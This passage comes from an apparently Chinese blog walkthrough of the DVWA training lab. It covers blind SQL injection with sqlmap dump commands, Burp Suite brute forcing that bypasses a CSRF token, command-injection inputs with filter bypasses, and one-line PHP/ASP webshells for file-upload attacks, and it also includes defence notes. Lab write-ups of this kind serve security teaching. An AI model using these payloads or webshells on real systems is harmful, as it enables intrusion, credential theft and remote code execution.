<h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$getid</span> ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = @<span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">rand</span>( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">sleep</span>( <span class="title function_ invoke__">rand</span>( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
<p>LIMIT 1可以通过#注释掉</p>
<p>这里只能使用基于bool的盲注</p>
<h2 id="Impossile"><a href="#Impossile" class="headerlink" title="Impossile"></a>Impossile</h2><h1 id="3-SQL注入（工具）"><a href="#3-SQL注入（工具）" class="headerlink" title="3.SQL注入（工具）"></a>3.SQL注入（工具）</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://blog.csdn.net/weixin_42160117/article/details/113999523">sqlmap参数</a></p>
<p><a href="https://blog.csdn.net/qq_45533800/article/details/108261537">Sqlmap常用参数</a></p>
<p>注入MySQL数据库常用参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;url&quot;  //判断参数是否存在注入</span><br><span class="line">sqlmap.py -u &quot;url&quot; --current-db  //查看网站当前数据库名称</span><br><span class="line">sqlmap.py -u &quot;url&quot; --is-dba  //查看当前用户权限</span><br><span class="line">sqlmap.py -u &quot;url&quot; --tables //猜解表名</span><br><span class="line">sqlmap.py -u &quot;url&quot; --columns -T &quot;要猜解的表名&quot;  //猜解列名</span><br><span class="line">sqlmap.py -u &quot;url&quot; --dump -C &quot;列名&quot; -T “表名”  //爆出字段数据</span><br></pre></td></tr></table></figure>

<p>一些常用参数集合</p>
<blockquote>
<p><code>-h</code> &#x2F;&#x2F;查看帮助选项</p>
<p><code>--dbs</code> &#x2F;&#x2F;查看网站所有数据库名称</p>
<p><code>--users</code> &#x2F;&#x2F;查看所有数据库的用户</p>
<p><code>--count</code>  &#x2F;&#x2F;统计条数 （该条命令可用在爆表名的时候，便于查看哪个是管理员的表）</p>
<p><code>--level</code> &#x2F;&#x2F;测试等级（1-5）默认是1，cookie注入是2，http头注入是3</p>
<p><code>--dbms=mysql/oracle/mssql</code> 指定数据库（这样既可以节省时间，在某些时候也可以绕过waf）</p>
<p><code>sqlmap.py -u “url”--batch --exclude-sysdbs</code> &#x2F;&#x2F;batch是使用sqlmap默认选项，不用按回车；exclude-sysdbs是排除系统自带的数据库 </p>
<p><code>--risk</code>    &#x2F;&#x2F;风险等级，共有四个等级，1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的sql注入测试</p>
<p><code>-m</code>       &#x2F;&#x2F;从文本中获取多个目标，文件中保存url格式，sqlmap会一个一个测试  sqlmap.py -m 1.txt</p>
<p><code>-r</code>        &#x2F;&#x2F;获取http请求注入,sqlmap可以从一个文本文件中获取http请求，这样就可以跳过设置一些其他参数,在存在注入的http请求头加*。</p>
<p>利用的场景：post，搜索注入，http头注入，登陆后的注入（在登录后存在注入点，因为只有在登录后才有cookie)<br><code>-g</code>       &#x2F;&#x2F;处理google搜索结果, sqlmap可以测试注入google的搜索结果中的get参数(前100个请求)       sqlmap.py -g “inurl:php?id&#x3D;”</p>
</blockquote>
<h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><p>sqlmap -u <a href="http://url/vulnerabilities/sqli/?id=1&amp;Submit=Submit">http://URL/vulnerabilities/sqli/?id=1&amp;Submit=Submit</a></p>
<p><img data-src="https://img-blog.csdnimg.cn/8ce1c002ea274a06ad4d676e7029c1f2.png" alt="在这里插入图片描述"></p>
<p>出现了302重定向会返回登录页面，证明这个页面需要cookie</p>
<p>sqlmap -u “<a href="http://url/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;">http://URL/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</a> –cookie&#x3D;”XXX”</p>
<blockquote>
<p>可以直接加 –batch默认回答，直接显示结果</p>
</blockquote>
<p>sqlmap -u “<a href="http://url/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;">http://URL/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</a> –cookie&#x3D;”XXX” –batch</p>
<blockquote>
<p>-D dvwa -T users -C user,password,user_id –dump</p>
<p>一般数据库中的信息都会加密，这个命令可以直接显示解密后的情况，并且会自动保存到本地</p>
</blockquote>
<h3 id="1-数据库名"><a href="#1-数据库名" class="headerlink" title="1.数据库名"></a>1.数据库名</h3><p>**sqlmap -u “<a href="http://url/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;">http://URL/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</a> –cookie&#x3D;”XXX” –batch –dbs</p>
<p><img data-src="https://img-blog.csdnimg.cn/fd3e4e77befc46489084b3804a39947f.png" alt="在这里插入图片描述"></p>
<h3 id="2-表名"><a href="#2-表名" class="headerlink" title="2.表名"></a>2.表名</h3><p><strong>sqlmap -u “<a href="http://url/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;">http://URL/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</a> –cookie&#x3D;”XXX” –batch -D dvwa –tables</strong></p>
<p><img data-src="https://img-blog.csdnimg.cn/a958211184d14d53a52d5ff3f614643a.png" alt="在这里插入图片描述"></p>
<h3 id="3-字段名"><a href="#3-字段名" class="headerlink" title="3.字段名"></a>3.字段名</h3><p>**sqlmap -u “<a href="http://url/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;">http://URL/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</a> –cookie&#x3D;”XXX” –batch -D dvwa -T users –columns</p>
<p><img data-src="https://img-blog.csdnimg.cn/e8ade18cdbf14964a4dac427f3c4a589.png" alt="在这里插入图片描述"></p>
<h3 id="4-数据"><a href="#4-数据" class="headerlink" title="4.数据"></a>4.数据</h3><p>**sqlmap -u “<a href="http://url/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;">http://URL/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</a> –cookie&#x3D;”XXX” –batch -D dvwa -T users -C user,password,user_id –dump</p>
<p><img data-src="https://img-blog.csdnimg.cn/704aaaee5b8b4f198ced238474c371ac.png" alt="在这里插入图片描述"></p>
<h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><p>burpsuite抓包保存到本地</p>
<p><strong>sqlmap -r &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;1.txt</strong> </p>
<p>后面加的和上面一样</p>
<p><strong>sqlmap -r &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;1.txt –batch -D dvwa -T users -C user,password,user_id –dump</strong><br><img data-src="https://img-blog.csdnimg.cn/e42f6febe4fb4a88b66fda1e0bf33a6f.png" alt="在这里插入图片描述"></p>
<h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><p>先抓包，然后用<code>sqlmap --second-url</code>注入</p>
<h3 id="1-查数据库名"><a href="#1-查数据库名" class="headerlink" title="1.查数据库名"></a>1.查数据库名</h3><p>**sqlmap -r &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;2.txt –batch -second-url “<a href="http://url/vulnerabilities/sqli/&quot;">http://URL/vulnerabilities/sqli/&quot;</a> –dbs</p>
<p><img data-src="https://img-blog.csdnimg.cn/210b0755035341728c6c2242a4c8072b.png" alt="在这里插入图片描述"></p>
<h3 id="2-查表名"><a href="#2-查表名" class="headerlink" title="2.查表名"></a>2.查表名</h3><p>**sqlmap -r &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;2.txt –batch -second-url “<a href="http://url/vulnerabilities/sqli/&quot;">http://URL/vulnerabilities/sqli/&quot;</a> -D dvwa –tables</p>
<p><img data-src="https://img-blog.csdnimg.cn/7edb8074a5a840d78da68e54b116bd08.png" alt="在这里插入图片描述"></p>
<h3 id="3-查字段名"><a href="#3-查字段名" class="headerlink" title="3.查字段名"></a>3.查字段名</h3><p><strong>sqlmap -r &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;2.txt –batch -second-url “<a href="http://url/vulnerabilities/sqli/&quot;">http://URL/vulnerabilities/sqli/&quot;</a> -D dvwa -T users –columns</strong></p>
<p><img data-src="https://img-blog.csdnimg.cn/995ba82b4c4b495d876a19c9193da9d4.png" alt="在这里插入图片描述"></p>
<h3 id="4-查数据"><a href="#4-查数据" class="headerlink" title="4.查数据"></a>4.查数据</h3><p>**sqlmap -r &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;2.txt –batch –second-url “<a href="http://url/vulnerabilities/sqli/&quot;">http://URL/vulnerabilities/sqli/&quot;</a> -D dvwa -T users -C user,password,user_id –dump</p>
<p><img data-src="https://img-blog.csdnimg.cn/a9a13fbe8bab4ea48f8cc6d93d2c191a.png" alt="在这里插入图片描述"></p>
<h3 id="5-参数"><a href="#5-参数" class="headerlink" title="5.参数"></a>5.参数</h3><blockquote>
<p><strong>-u {url}</strong><br><strong>-r {file}</strong><br><strong>–batch</strong> 跳过问询（yes）执行<br><strong>–second-url {To url}</strong><br><strong>–dbs：-D 数据库名</strong><br><strong>–tables：-T 数据表名</strong><br><strong>–columns：-C 字段名</strong><br><strong>–dump</strong></p>
</blockquote>
<h1 id="4-暴力破解（brute-force）"><a href="#4-暴力破解（brute-force）" class="headerlink" title="4.暴力破解（brute force）"></a>4.暴力破解（brute force）</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p>弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人(他们有可能对你很了解)猜测到或被破解工具破解的口令均为弱口令。弱口令指的是仅包含简单数字和字母的口令，例如”123”、”abc”等。</p>
<p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p>
<p><code>两个字：撞库;三个字：枚举法</code></p>
<p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：</p>
<p>1.是否要求用户设置复杂的密码；</p>
<p>2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；</p>
<p>3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；</p>
<p>4.是否采用了双因素认证；</p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>暴力破解的成功率是100%的，但是只要暴力破解获得的数据的价值远小于其时间和精力成本时，那就达到了防御的目的了</p>
<p>最有效方式是设置复杂的密码（英文字母大小写、数字、符号混合）</p>
<p>登录页面采用有效的验证码机制</p>
<p>对用户密码错误的次数做限制</p>
<h2 id="burpsuite攻击模式"><a href="#burpsuite攻击模式" class="headerlink" title="burpsuite攻击模式"></a>burpsuite攻击模式</h2><p><a href="https://blog.csdn.net/weixin_59872639/article/details/122482102">burpsuite的使用</a></p>
<p>狙击手模式（Sniper）：单payload位置,单payload集合（先爆破A，再爆破B）</p>
<p>攻城锤模式（Battering ram）：单payload位置,单payload集合（两个用相同的密码一起爆破）</p>
<p>草叉模式（Pitchfork）：多payload位置，多payload集合（两个用一一对应的集合爆破）</p>
<p>集束炸弹模式(Cluster bomb) ：多payload位置，多payload集合（两个用交叉组合的集合爆破）</p>
<h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><p>抓包</p>
<p>发送到Intruder</p>
<p><img data-src="https://img-blog.csdnimg.cn/a7a35e29ac4c46a893fb8f112941b9f6.png" alt="在这里插入图片描述"></p>
<p>添加&#x2F;修改payload</p>
<p>修改Attack Type模式</p>
<p><a href="https://www.cnblogs.com/BOHB-yunying/articles/14005397.html">四种模式</a></p>
<blockquote>
<p>Sniper:对变量一次进行破解，多个标记依次进行。（俗话简单来说就是，用户名和密码用的是一套字典，破解的时候也只是导入一个字典，但是它会根据先破解用户名，破解出来以后急需破解密码这样的顺序，对于简单的用户名密码字典数目少的可以考虑）</p>
<p>Battering ram:对变量同时进行破解，多个标记同时进行。（这个也是只有一个字典但区别是，可以同时进行，就是先破解用户名破解完了继续破解密码，相比遇上一个速度更快）</p>
<p>Pitchfork:每一个变量标记对应一个字典，取每个字典的对应项。（这个意思就是，每个变量一个字典，破解的时候每个字典的一号对应另一个字典的一号进行破解，这样破解对于那些一一对应的用户名密码来说速度很快，但很明显我们没办法准确的定位用户名和密码，显然不适用于每个情况）</p>
<p>Cluster bomb：每个变量对应一个字典，并且进行交际破解，尝试各种组合，适合于用户名加密码破解。（这种情况就是普罗大众很容易明白理解的情况就是多个字典进行笛卡尔积，依次破解，这种就会有多种组合，时间上也是一个问题，当然对于需要用时很长的，我们可以添加进程，用来适量缩短时间）</p>
</blockquote>
<p>payload添加字典</p>
<p>修改进程池</p>
<p>爆破，长度不同即结果</p>
<p><img data-src="https://img-blog.csdnimg.cn/5f9b460299ff429c87c8cfd12449e634.png" alt="在这里插入图片描述"></p>
<h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><p>使用了mysqli_real_escape_string函数进行符号转义,但是还是对爆破没有什么影响，可以直接进行爆破。</p>
<h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><p>加了一个Token</p>
<p><img data-src="https://img-blog.csdnimg.cn/9ea2a4fc2eb04aac94f2ba6a6cbe310e.png" alt="在这里插入图片描述"><br>将密码和token设为payload</p>
<p>修改attrack type</p>
<p>payload 1——simple list </p>
<p>payload 2——Recursive Grep（递归）</p>
<p>修改线程为1</p>
<p>在options：Grep-Extract中Add：Refetch response</p>
<p>将其中Token复制到payload2：initial payload for first request</p>
<p>然后可以Attack</p>
<p><img data-src="https://img-blog.csdnimg.cn/d433a5ea7f5f49518a7adc469c0df61c.png" alt="在这里插入图片描述"></p>
<blockquote>
<p>Simple list 简单字典<br>Runtime file 运行文件<br>Custom iterator 自定义迭代器<br>Character substitution 字符替换<br>Recursive grep 递归查找<br>Illegal Unicode 非法字典<br>Character blocks 字符快<br>Numbers 数组组合<br>Dates 日期组合<br>Brute forcer 暴力破解<br>Null payloads 空Payload<br>Username generator 用户名生成<br>Copy other payload 复制其他Payload</p>
</blockquote>
<h1 id="5-命令注入（command-injection）"><a href="#5-命令注入（command-injection）" class="headerlink" title="5.命令注入（command injection）"></a>5.命令注入（command injection）</h1><h2 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h2><p>和SQL注入差不多，没有检查输入导致执行了精心构造的命令</p>
<p>命令注入的形成需要如下三个条件：</p>
<p>1）使用了内部调用shell的函数：system()，exec()等</p>
<p>2）将外界传入的参数没有足够的过滤，直接传递给内部调用shell的函数</p>
<p>3）参数中shell的元字符没有被转义</p>
<p>常用命令：（总结来说就是系统操作命令DOS命令都可以在此执行试试）</p>
<p>这里因为在windows上部署的DVWA，所以下面列了windows的命令</p>
<p>ipconfig，net user（查看系统用户），dir（查看当前目录），find（查找包含指定字符的行），whoami（查看系统当前有效用户名）<br>A&amp;B（简单的拼接，AB之间无制约关系），A&amp;&amp;B（A执行成功才会执行B），A|B（A的输出作为B的输入），A||B（A执行失败，然后才会执行B）</p>
<p>;	前后命令依次执行	注意前后顺序，若更变目录，则必须在“一句”指令内</p>
<p>&amp;	前台执行后任务，后台执行前任务	如 a&amp;b&amp;c 则显示c的执行信息，a b在后台执行</p>
<p>|	管道，只输出后者的命令	当第一条命令失败时，它仍然会执行第二条命令</p>
<p><code>（反引号，仅linux）即命令替换</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo `date` //输出系统时间</span><br></pre></td></tr></table></figure>

<p>使用反引号运算符的效果与函数shell_exec()相同，但在激活了安全模式或者关闭了shell_exec()时是无效的</p>
<p>$(command)	这是命令替换的不同符号。与反引号效果一样。echo $(date),输出系统时间.	按理说更推荐用这种方法，而不是反引号。</p>
<h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><p><a href="https://blog.csdn.net/llzhang_fly/article/details/119685242">命令注入防御</a></p>
<p>1.校验外部数据命令，在执行system、eval等命令执行功能的函数前，确定参数内容。</p>
<p>对数据的合法性进行校验</p>
<p>使用正则表达式对外部数据命令进行校验</p>
<p>2.使用白名单安全过滤：比较适用于固定不变的命令或者数据（校验包含哪些目标字符，而不是定义不能包含什么字符）或者直接将命令定义为宏，然后使用system() 系统调用</p>
<p>3.使用黑名单过滤命令：黑名单机制还还是有可能会绕过系统校验，进行命令注入；不如白名单安全</p>
<p>4.使用 exec系列族函数代替 system() 系统调用函数，选择不调用系统命令的实现方法、避免使用内部调用shell的函数、不将外界传入的字符串传递给命令行参数</p>
<p>5.使用安全的函数对传递给系统命令的参数进行转义</p>
<p>6.将应用程序的权限降到最低</p>
<p>7.给web服务器系统及使用的中间件及时打上安全补丁</p>
<p>8.使用函数对字符串进行转义：</p>
<blockquote>
<p>escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号<code>&#39;</code>会被转义为<code>\&#39;</code>，双引号<code>&quot;</code>会被转义为<code>\&quot;</code>，分号<code>;</code>会被转义为<code>\;</code>，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。</p>
</blockquote>
<h2 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2><p>输入127.0.0.1得到ping结果</p>
<p>输入127.0.0.1 &amp; ipconfig得到ping+ipconifg结果</p>
<p>输入127.0.0.1 &amp; net user无结果？</p>
<blockquote>
<p>这是因为装的不同的DVWA对应的PHP study版本不一样，切换一个版本即可，将版本切换成php-5.5.38+apache，php-5.4.45+apache我试过都是可行的，别的版本会遇到net user无法显示的问题。<br>但是修改版本也不行。。</p>
</blockquote>
<p>输入127.0.0.1 &amp; dir有结果</p>
<p>输入127.0.0.1 &amp; whoami有结果</p>
<p><img data-src="https://img-blog.csdnimg.cn/e16160146d614e07943c4391125279f2.png" alt="在这里插入图片描述"></p>
<p>输入127.0.0.1 &amp; systeminfo有结果</p>
<p>输入 1 &amp; echo “xx” &gt;&gt; 1.txt可以新建文件</p>
<blockquote>
<p>md app &#x2F; mkdir app 新建App文件夹 </p>
<p>type nul&gt;1.txt 创建空文件</p>
<p>echo 1 &gt; 1.txt 创建非空文件</p>
</blockquote>
<h2 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2><p>查看源码发现有字符被转义</p>
<p><code>&amp;&amp;</code>和<code>;</code>被转义成空</p>
<p><img data-src="/../images/DVWA/image-20220913152128472.png" alt="image-20220913152128472"></p>
<p>但是”&amp;”还能用，或者用分号将双&amp;号隔开，如<code>&amp;;&amp;</code></p>
<p><img data-src="/../images/DVWA/image-20220913152740114.png" alt="image-20220913152740114"></p>
<h2 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h2><p>查看源码发现以下字符被转义为空</p>
<p><code>&amp; ; &quot;| &quot; - $ ( ) `||</code><br>(这里单|号后面有个空格，所以单|号未被转义)</p>
<blockquote>
<p>可用trim()函数解决这个问题，因为 trim(str) 可以删除字符串左右两边的空格。</p>
</blockquote>
<p>输入1 || whoami 可以输出？可能是后面的<code>| </code>被转义成空，直接执行了<code>ping 1 |whoami</code></p>
<p><img data-src="https://img-blog.csdnimg.cn/3be43737c8a746f49487cd2e77525fc1.png" alt="在这里插入图片描述"></p>
<h1 id="6-文件上传（File-Upload）"><a href="#6-文件上传（File-Upload）" class="headerlink" title="6.文件上传（File Upload）"></a>6.文件上传（File Upload）</h1><h2 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://blog.csdn.net/whoim_i/article/details/102789011">文件上传漏洞详解</a></p>
<p>网站文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者像某个可通过web访问的目录上传任意php文件，并能够将这些文件传递给php解释器，就可以在远程服务器上执行任意php脚本。</p>
<p>当系统存在文件上传漏洞同时攻击者可以将<strong>病毒，木马，webshell，其他恶意脚本或者是包含了脚本的图片</strong>上传到服务器，这些文件将对攻击者后续攻击提供便利。根据具体漏洞的差异，此处上传的脚本可以是正常后缀的php,asp以及jsp脚本，也可以是篡改后缀后的这几类脚本。</p>
<blockquote>
<p>原因：</p>
<p>1 对于上传文件的后缀名（扩展名）没有做较为严格的限制 </p>
<p>2 对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法)没有做检查 </p>
<p>3 权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件） </p>
<p>Shebang（也称Hashbang ）是一个由井号和叹号构成的字符序列 #! ，其出现在文本文件的第一行的前两个字符。 在文件中存在 Shebang 的情况下，类 Unix 操作系统的程序加载器会分析 Shebang 后的内容，将这些内容作为解释器指令，并调用该指令，并将载有 Shebang 的文件路径作为该解释器的参数。</p>
<p>4 对于webserver对于上传文件或者指定目录的行为没有做限制</p>
</blockquote>
<blockquote>
<p>原理： 在 WEB 中进行文件上传的原理是通过将表单设为 multipart&#x2F;form-data，同时加入文件域，而后通过 HTTP协议将文件内容发送到服务器，服务器端读取这个分段 (multipart)的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上。</p>
</blockquote>
<p>**上传文件操作本身是没有问题的，问题在于文件上传到服务器后，服务器怎么处理和解释文件。</p>
<p>攻击形式：</p>
<p>上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行。</p>
<p>上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为</p>
<p>(其他通过类似方式控制策略文件的情况类似);</p>
<p>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。</p>
<p>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</p>
<p>要完成这个攻击，要满足以下几个条件：</p>
<p>1.上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径。</p>
<p>2.用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法得到Web容器解释这个脚本，那么也不能称之为漏洞。</p>
<p>3.用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。</p>
<h2 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h2><p>1.对上传文件扩展名进行严格过滤，设置白名单机制只允许特定扩展名文件上传，严格过滤扩展名为<code>.php .asp .bat</code>等可执行文件上传</p>
<p>2.限制目录权限，对于文件上传目录设置可读、可写、不可执行权限，禁止用户上传的文件在后台执行。</p>
<p>3.隐藏文件上传目录，用户上传文件的目标目录对用户隐藏。或者将存储文件的服务器与网站服务器分离</p>
<h2 id="Low-5"><a href="#Low-5" class="headerlink" title="Low"></a>Low</h2><p>可以上传php</p>
<p>构建一句话木马（webshell）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">asp</span><br><span class="line">&lt;%<span class="title function_ invoke__">execute</span>(<span class="title function_ invoke__">request</span>(<span class="string">&quot;value&quot;</span>))%&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUSET</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$ _REQUEST</code>包含了<code>$ _GET</code>、<code>$ _POST</code>、<code>$ _COOKIE</code>的所有内容，是它们的集合体。只要把变量用POST或GET，甚至用cookies传输上去都可以执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">aspx</span><br><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;?php ?&gt;</code>为php固定规范写法，<code>@</code>在php中含义为后面如果执行错误不显示错误信息，增加隐蔽性。<code>eval()</code>函数表示括号里的语句全做代码执行，<code>$_POST[&#39;shell&#39;]</code>表示从页面中以post方式获取变量shell的值。</p>
<p>上传1.php后，网页会显示上传文件的路径。</p>
<p>（这里windows defender会报毒，必须同意保留才能上传成功并显示路径）</p>
<p><img data-src="https://img-blog.csdnimg.cn/0f893334aed14dcc987286c914597d3d.png" alt="在这里插入图片描述"></p>
<p>使用URL（GET）或者HackBar（POST）将<code>shell=system(&quot;whoami&quot;);</code>发送到当前网页+回显路径（即相对路径）。</p>
<p>得到预期结果</p>
<p><img data-src="https://img-blog.csdnimg.cn/be9e1ae226c3488d8eebfe3f3dc60736.png" alt="在这里插入图片描述"></p>
<p><a href="https://www.w3school.com.cn/php/php_file_create.asp">php</a></p>
<h2 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2><p>查看源码或者上传文件，发现对文件类型（后缀名）进行了限制，只能上传jpeg和png格式。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span 